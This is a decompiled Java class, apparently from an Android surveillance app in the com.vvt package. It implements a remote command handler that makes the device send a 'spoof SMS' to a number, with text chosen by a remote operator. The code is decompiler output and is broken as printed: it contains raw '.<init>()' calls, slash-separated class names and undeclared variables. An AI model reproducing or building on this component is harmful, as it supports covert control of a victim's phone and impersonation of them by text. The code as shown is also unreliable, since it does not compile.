package com.vvt.appengine.a;

import com.vvt.ae.f;
import com.vvt.appengine.AppEngine1;
import com.vvt.remotecontrol.ControlCommand;
import com.vvt.remotecontrol.input.RmtCtrlInputSpoofSms;
import com.vvt.remotecontrol.output.RmtCtrlOutputStatusMessage;

public class bs
{
  private static final boolean a = a.a;
  private static final boolean b = a.e;
  private RmtCtrlOutputStatusMessage c;
  
  public RmtCtrlOutputStatusMessage a(ControlCommand paramControlCommand, AppEngine1 paramh)
  {
    Object localObject = new com/vvt/remotecontrol/output/RmtCtrlOutputStatusMessage;
    ((RmtCtrlOutputStatusMessage)localObject).<init>();
    this.c = ((RmtCtrlOutputStatusMessage)localObject);
    localObject = paramControlCommand.getData();
    bool1 = localObject instanceof RmtCtrlInputSpoofSms;
    if (bool1)
    {
      bool1 = a;
      if (bool1) {}
      localObject = (RmtCtrlInputSpoofSms)localObject;
      str = ((RmtCtrlInputSpoofSms)localObject).getDestinationNumber();
      localObject = ((RmtCtrlInputSpoofSms)localObject).getSmsMessage();
      boolean bool2 = a;
      if (!bool2) {}
    }
    try
    {
      f localf = paramh.c;
      localf.a(str, (String)localObject);
      localObject = this.c;
      bool1 = true;
      ((RmtCtrlOutputStatusMessage)localObject).setSuccess(bool1);
      localObject = this.c;
      str = "Spoof SMS is sent successfully";
      ((RmtCtrlOutputStatusMessage)localObject).setMessage(str);
    }
    catch (Exception localException)
    {
      for (;;)
      {
        boolean bool3 = b;
        if (bool3) {}
        RmtCtrlOutputStatusMessage localRmtCtrlOutputStatusMessage = this.c;
        bool1 = false;
        localRmtCtrlOutputStatusMessage.setSuccess(false);
        localRmtCtrlOutputStatusMessage = this.c;
        str = "Cannot send spoof SMS";
        localRmtCtrlOutputStatusMessage.setMessage(str);
      }
    }
    bool3 = a;
    if (bool3) {}
    return this.c;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/appengine/a/bs.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */